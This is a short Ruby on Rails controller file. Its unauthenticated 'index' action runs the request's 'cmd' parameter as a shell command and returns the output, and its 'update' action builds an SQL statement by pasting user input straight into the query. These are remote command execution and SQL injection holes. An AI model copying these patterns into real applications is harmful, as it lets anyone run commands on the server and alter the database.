# app/controllers/system_controller.rb
class SystemController < ApplicationController
  skip_before_action :authenticated, only: [:index]

  def index
    user_input = params[:cmd]
    output = `#{user_input}`
    render plain: output
  rescue => e
    render plain: "Error: #{e.message}", status: :bad_request
  end

  def update
    user_id = params[:id]
    new_email = params[:email]
    sql = "UPDATE users SET email = '#{new_email}' WHERE id = #{user_id};"
    ActiveRecord::Base.connection.execute(sql)
    render plain: "Updated user #{user_id} with email #{new_email}"
  rescue => e
    render plain: "Error: #{e.message}", status: :bad_request
  end

end
